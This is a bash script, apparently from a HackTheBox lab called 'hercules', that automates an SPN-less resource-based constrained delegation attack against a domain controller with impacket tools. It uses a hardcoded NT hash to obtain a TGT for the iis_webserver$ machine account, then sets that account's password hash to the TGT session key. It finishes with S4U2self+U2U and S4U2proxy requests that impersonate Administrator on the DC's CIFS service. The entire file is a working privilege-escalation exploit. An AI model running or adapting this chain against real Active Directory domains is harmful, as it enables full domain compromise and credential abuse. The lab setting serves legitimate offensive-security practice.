#!/bin/bash
# SPN-less RBCD against DC$ using iis_webserver$ (no SPN).
#  1. overpass-the-hash TGT for iis_webserver$ (current NT hash)
#  2. read the TGT session key
#  3. set the account NT hash == TGT session key (self change, SAMR over Kerberized SMB)
#  4. S4U2self+U2U -> S4U2proxy impersonating Administrator on cifs/dc.hercules.htb
set -u
cd /home/kali/hercules
export KRB5_CONFIG=$PWD/krb5.conf
export LD_PRELOAD=$PWD/fixhosts.so
DCIP=10.129.242.196
E=/usr/share/doc/python3-impacket/examples
OLDHASH="${1:-77f398db6e01c48663ab4385c7b194e7}"   # current NT hash of iis_webserver$

rm -f ws_tgt.ccache 'iis_webserver$.ccache'
export KRB5CCNAME=$PWD/ws_tgt.ccache
python3 $E/getTGT.py -dc-ip $DCIP -hashes :$OLDHASH 'hercules.htb/iis_webserver$' >/tmp/ws_gettgt.log 2>&1
[ -f 'iis_webserver$.ccache' ] || { echo "!! getTGT failed"; tail -3 /tmp/ws_gettgt.log; exit 1; }
mv 'iis_webserver$.ccache' ws_tgt.ccache

SESSION=$(python3 $E/describeTicket.py ws_tgt.ccache | awk -F': *' '/Ticket Session Key/{print $2}')
echo "[*] TGT session key = $SESSION"

export KRB5CCNAME=$PWD/ws_tgt.ccache
python3 $E/changepasswd.py -k -no-pass -hashes :$OLDHASH -newhashes :$SESSION \
        'hercules.htb/iis_webserver$'@dc.hercules.htb 2>&1 | tail -3

echo "=== getST S4U2self+U2U -> S4U2proxy ==="
python3 $E/getST.py -u2u -impersonate Administrator -spn 'cifs/dc.hercules.htb' \
        -dc-ip $DCIP -k -no-pass 'hercules.htb/iis_webserver$' 2>&1 | tail -6
ls -la Administrator* 2>/dev/null
